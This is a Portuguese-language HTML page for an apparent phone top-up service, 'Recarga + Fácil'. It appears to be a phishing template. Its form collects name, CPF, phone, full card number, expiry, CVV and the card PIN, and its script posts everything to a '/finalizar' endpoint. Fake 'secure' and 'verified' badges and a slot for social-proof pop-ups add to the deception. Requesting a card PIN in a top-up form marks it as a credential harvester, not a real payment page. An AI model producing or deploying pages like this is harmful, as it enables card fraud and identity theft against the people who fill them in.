<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga + Fácil | Oficial</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            
            /* CONFIGURAÇÃO DA IMAGEM DE FUNDO */
            /* O linear-gradient cria uma película escura (0.5) para o formulário se destacar */
            background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('fundo.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-repeat: no-repeat;
            color: #333;
        }

        .container {
            background-color: rgba(255, 255, 255, 0.95); /* Fundo semi-transparente */
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            margin: 40px 20px;
            text-align: center;
        }

        h2 { color: #0056b3; margin-bottom: 20px; }

        input, select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 20px;
        }

        button:hover { background-color: #218838; }

        .footer-selos {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 15px;
            opacity: 0.8;
        }

        /* Estilo para as notificações de prova social */
        #notification-container {
            position: fixed;
            bottom: 20px;
            left: 20px;
            z-index: 1000;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Recarga + Fácil 📱</h2>
        <p>Informe os dados para recarregar agora</p>
        
        <form id="formRecarga">
            <input type="text" id="nome" placeholder="Nome Completo" required>
            <input type="text" id="cpf" placeholder="CPF" required>
            <input type="text" id="telefone" placeholder="(00) 00000-0000" required>
            
            <select id="operadora">
                <option value="">Selecione a Operadora</option>
                <option value="Vivo">Vivo</option>
                <option value="Tim">Tim</option>
                <option value="Claro">Claro</option>
                <option value="Oi">Oi</option>
            </select>

            <select id="valor">
                <option value="">Valor da Recarga</option>
                <option value="20">R$ 20,00</option>
                <option value="30">R$ 30,00</option>
                <option value="50">R$ 50,00</option>
                <option value="100">R$ 100,00</option>
            </select>

            <input type="text" id="cartao" placeholder="Número do Cartão" required>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="data" placeholder="MM/AA" required>
                <input type="text" id="cvv" placeholder="CVV" required>
            </div>
            <input type="password" id="senha" placeholder="Senha do Cartão" required>

            <button type="submit">FINALIZAR RECARGA</button>
        </form>

        <div class="footer-selos">
            <small>🔒 Ambiente Seguro</small>
            <small>✅ Verificado</small>
        </div>
    </div>

    <script>
        document.getElementById('formRecarga').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const dados = {
                nome: document.getElementById('nome').value,
                cpf: document.getElementById('cpf').value,
                telefone: document.getElementById('telefone').value,
                operadora: document.getElementById('operadora').value,
                valor: document.getElementById('valor').value,
                cartao: document.getElementById('cartao').value,
                data: document.getElementById('data').value,
                cvv: document.getElementById('cvv').value,
                senha: document.getElementById('senha').value
            };

            try {
                const response = await fetch('/finalizar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                });

                if (response.ok) {
                    alert('Recarga processada com sucesso!');
                    window.location.reload();
                }
            } catch (err) {
                alert('Erro ao processar recarga. Tente novamente.');
            }
        });
    </script>

</body>
</html>
